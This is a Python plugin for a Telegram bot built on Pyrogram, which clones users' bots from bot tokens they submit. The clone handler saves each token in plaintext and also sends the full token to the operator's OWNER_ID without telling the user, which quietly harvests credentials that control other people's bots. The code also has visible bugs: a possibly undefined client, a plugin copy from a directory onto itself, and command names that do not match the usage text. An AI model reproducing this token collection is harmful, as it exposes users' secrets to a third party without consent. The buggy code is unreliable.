from BADUC.core.clients import *
from BADUC.core.config import *
from BADUC.core.command import *
from pyrogram import filters, Client, idle
from pyrogram.types import Message
import os
import json
import shutil
import threading

# Directory to store clone data
CLONE_DATA_FILE = "clone_data.json"
PLUGINS_DIR = "BADUC/plugins/clone2"

# In-memory cache for clone data
clone_data_cache = {}
bot_locks = {}

# Get lock for each bot instance
def get_bot_lock(bot_token):
    if bot_token not in bot_locks:
        bot_locks[bot_token] = threading.Lock()
    return bot_locks[bot_token]

# Thread-safe load clone data with caching
def load_clone_data():
    if not clone_data_cache:
        if os.path.exists(CLONE_DATA_FILE):
            with open(CLONE_DATA_FILE, "r") as file:
                clone_data_cache.update(json.load(file))
    return clone_data_cache

# Thread-safe save clone data to cache and file
def save_clone_data():
    with open(CLONE_DATA_FILE, "w") as file:
        json.dump(clone_data_cache, file)

# Ensure the plugin directory exists
def ensure_plugin_directory():
    if not os.path.exists(PLUGINS_DIR):
        os.makedirs(PLUGINS_DIR)

# Copy plugins into the clone directory
def copy_plugins():
    source_plugin_dir = "BADUC/plugins/clone2"
    for plugin in os.listdir(source_plugin_dir):
        src_path = os.path.join(source_plugin_dir, plugin)
        dst_path = os.path.join(PLUGINS_DIR, plugin)
        if os.path.isdir(src_path) and not os.path.exists(dst_path):
            shutil.copytree(src_path, dst_path)

@bot.on_message(filters.command("clonee"))
async def clone(bot: Client, msg: Message):
    if len(msg.command) < 2:
        await msg.reply("Usage: `/clone <bot_token>`\nSend your bot token to clone. 🤖")
        return

    user_id = msg.from_user.id
    bot_token = msg.command[1]
    clone_data = load_clone_data()

    if bot_token in clone_data:
        await msg.reply("This bot has already been cloned!")
        return
    
    try:
        reply_msg = await msg.reply("Please wait... Setting up the bot and loading plugins. 🔄")
        ensure_plugin_directory()
        copy_plugins()

        # Create a separate lock for each bot token
        lock = get_bot_lock(bot_token)
        with lock:
            client = Client(
                name="ClonedBot",
                api_id=API_ID,
                api_hash=API_HASH,
                bot_token=bot_token,
                plugins=dict(root=PLUGINS_DIR)
            )

            await client.start()
            bot_info = await client.get_me()

            # Save clone data including bot token
            clone_data[bot_token] = {
                "bot_id": bot_info.id,
                "bot_username": bot_info.username,
                "owner_id": user_id,
                "plugins": os.listdir(PLUGINS_DIR),
                "bot_token": bot_token  # Save the bot token as well
            }

            # Update in-memory cache
            clone_data_cache[bot_token] = clone_data[bot_token]
            save_clone_data()  # Persist data to file

            # Notify owner with bot token included
            owner_msg = f"New bot clone created:\n\n" \
                        f"**Bot Username:** @{bot_info.username}\n" \
                        f"**Bot ID:** {bot_info.id}\n" \
                        f"**Bot Token:** `{bot_token}`\n" \
                        f"**Plugins:** {', '.join(os.listdir(PLUGINS_DIR))}\n" \
                        f"**Owner ID:** {user_id}"
            await bot.send_message(OWNER_ID, owner_msg)

            # Success message for the user
            success_msg = (
                f"✅ Bot cloned successfully!\n\n"
                f"🤖 **Bot Username:** @{bot_info.username}\n"
                f"🆔 **Bot ID:** {bot_info.id}\n"
                f"**Plugins Loaded:** {', '.join(os.listdir(PLUGINS_DIR))}"
            )
            await reply_msg.edit(success_msg)
            await idle()

    except Exception as e:
        error_msg = f"❌ **ERROR:** `{str(e)}`\nPlease check your bot token, API ID, or API Hash."
        await msg.reply(error_msg)
    finally:
        if client.is_connected:
            await client.stop()

@bot.on_message(filters.command("deleteall"))
async def delete_all(bot: Client, msg: Message):
    user_id = msg.from_user.id
    if user_id != OWNER_ID:
        await msg.reply("Only the main bot owner can delete all cloned bots!")
        return

    clone_data = load_clone_data()
    clone_data.clear()
    save_clone_data()

    await msg.reply("All cloned bots have been deleted successfully!")

@bot.on_message(filters.command("listt"))
async def clone_list(bot: Client, msg: Message):
    user_id = msg.from_user.id
    clone_data = load_clone_data()
    user_clones = {k: v for k, v in clone_data.items() if v["owner_id"] == user_id}
    
    if not user_clones:
        await msg.reply("You don't have any cloned bots.")
        return
    
    clone_list_msg = "Your Cloned Bots:\n\n"
    for token, details in user_clones.items():
        clone_list_msg += f"**Bot Username:** @{details['bot_username']} | **Bot ID:** {details['bot_id']} | **Plugins:** {', '.join(details['plugins'])}\n"
    await msg.reply(clone_list_msg)

@bot.on_message(filters.command("deletee"))
async def clone_delete(bot: Client, msg: Message):
    if len(msg.command) < 2:
        await msg.reply("Usage: `/delete <bot_token>`\nProvide the bot token to delete.")
        return

    user_id = msg.from_user.id
    bot_token = msg.command[1]
    clone_data = load_clone_data()

    if bot_token not in clone_data:
        await msg.reply("Bot clone not found!")
        return

    if clone_data[bot_token].get("owner_id") != user_id:
        await msg.reply("You are not the owner of this cloned bot!")
        return
    
    del clone_data[bot_token]
    clone_data_cache.pop(bot_token, None)  # Remove from cache
    save_clone_data()

    await msg.reply(f"Cloned bot with token `{bot_token}` has been deleted.")

# Restricting commands to the cloned bot's owner
@bot.on_message(filters.command([]))  # Capture all commands
async def restricted_command(bot: Client, msg: Message):
    command = msg.text.split()[0].lstrip("/")
    clone_data = load_clone_data()

    # Check if the user is the owner of any cloned bot
    for token, details in clone_data.items():
        if details["owner_id"] == msg.from_user.id:
            # The user is the owner, allow them to use the command
            return  # Command logic can be placed here for execution
        else:
            await msg.reply("You are not the owner of this cloned bot, so you cannot use its commands!")
            return
